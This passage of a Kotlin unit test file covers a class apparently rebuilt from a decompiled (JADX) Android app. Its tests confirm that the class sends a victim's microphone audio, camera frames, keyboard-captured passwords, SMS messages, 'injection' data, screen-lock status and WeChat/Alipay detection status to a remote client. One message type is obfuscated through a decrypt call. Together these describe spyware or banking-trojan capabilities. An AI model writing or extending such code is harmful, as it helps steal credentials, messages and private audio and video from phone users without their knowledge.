        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ===============================================================
    // sendMicData() — JADX: c6
    // ===============================================================

    @Test
    fun `sendMicData sends audio data when connected`() {
        manager.setTestClient(testClient, "dev-mic")
        manager.setTestConnectionState(true, false)

        manager.sendMicData(44100, 1024, "base64audiodata==")

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        // JADX uses StringUtil.decrypt for the type field
        val expectedType = StringUtil.decrypt("JlASKEIoBCFZNBRYBD5ENw==")
        assertEquals(expectedType, envelope!!.getString("type"))
        val data = envelope.getJSONObject("data")
        assertEquals("base64audiodata==", data.getString("audio"))
        assertEquals(44100, data.getInt("sampleRate"))
        assertEquals(1024, data.getInt("sampleCount"))
        assertEquals(1, data.getInt("channelCount"))
    }

    @Test
    fun `sendMicData does nothing when not connected`() {
        manager.setTestClient(testClient, "dev-mic")
        manager.setTestConnectionState(false, false)

        manager.sendMicData(44100, 1024, "audio")
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ===============================================================
    // Envelope structure verification
    // ===============================================================

    @Test
    fun `all envelopes contain timestamp as Long`() {
        manager.setTestClient(testClient, "dev-ts")
        val before = System.currentTimeMillis()
        manager.sendOperationLog(JSONObject().put("action", "test"))
        val after = System.currentTimeMillis()

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        val ts = envelope!!.getLong("timestamp")
        assertTrue("Timestamp should be >= before", ts >= before)
        assertTrue("Timestamp should be <= after", ts <= after)
    }

    @Test
    fun `all envelopes contain sessionId matching deviceId`() {
        manager.setTestClient(testClient, "session-abc")
        manager.sendPasswordData(JSONObject().put("pw", "x"))
        manager.sendIncomingSms(JSONObject().put("n", "1"))
        manager.sendOperationLog(JSONObject().put("a", "b"))

        assertEquals(3, testClient.sentMessages.size)
        for (raw in testClient.sentMessages) {
            val env = JSONObject(raw)
            assertEquals("session-abc", env.getString("sessionId"))
        }
    }

    // ===============================================================
    // Multiple sends accumulate
    // ===============================================================

    @Test
    fun `multiple send calls accumulate messages`() {
        manager.setTestClient(testClient, "dev-multi")
        manager.sendPasswordData(JSONObject())
        manager.sendIncomingSms(JSONObject())
        manager.uploadSms(JSONObject())
        manager.sendCameraFrame("img", "back")
        manager.uploadInjectionData(JSONObject())
        manager.sendPermissionsUpdate(RuntimeEnvironment.getApplication())
        manager.sendPermissionResponse(JSONObject())
        manager.sendScreenLockStatus(JSONObject())
        manager.sendOperationLog(JSONObject())
        manager.sendWechatDetectionStatus(JSONObject())
        manager.sendAlipayDetectionStatus(JSONObject())
        manager.sendAutoPasswordDetectionStatus(JSONObject())
        manager.notifyLocalServiceFullConfig(JSONObject())
        manager.sendEvent("generic", JSONObject())

        assertEquals(14, testClient.sentMessages.size)

        val types = testClient.sentMessages.map { JSONObject(it).getString("type") }
        assertEquals(14, types.toSet().size)
    }

    // ===============================================================
    // sendData / sendPassword (Phase 10 stubs)
    // ===============================================================

    @Test
    fun `sendData wraps in injection_data envelope`() {
        manager.setTestClient(testClient, "dev-sd")
        val data = JSONObject().put("key", "val")
        manager.sendData(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("injection_data", envelope!!.getString("type"))
    }

    @Test
    fun `sendPassword creates proper payload`() {
        manager.setTestClient(testClient, "dev-sp")
        manager.sendPassword("mypass", "keyboard", "gboard")

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("password_data", envelope!!.getString("type"))
        val data = envelope.getJSONObject("data")
        assertEquals("mypass", data.getString("text"))
        assertEquals("keyboard", data.getString("source"))
        assertEquals("gboard", data.getString("inputMethod"))
    }

    // ===============================================================
    // getDataSyncClient() — JADX: b1
    // ===============================================================

    @Test
    fun `getDataSyncClient returns null when not initialized`() {
        assertNull(manager.getDataSyncClient())
    }

    @Test
    fun `getDataSyncClient returns client when set`() {
        manager.setTestClient(testClient, "dev-gc")
        assertNotNull(manager.getDataSyncClient())
    }

    // ===============================================================
    // Last heartbeat time
    // ===============================================================

    @Test
    fun `lastHeartbeatTime updates after heartbeat`() {
        manager.setTestClient(testClient, "dev-lht")
        manager.setTestConnectionState(true, true)

        assertEquals(0L, manager.lastHeartbeatTime)
        manager.sendHeartbeat()
        assertTrue(manager.lastHeartbeatTime > 0L)
    }
}
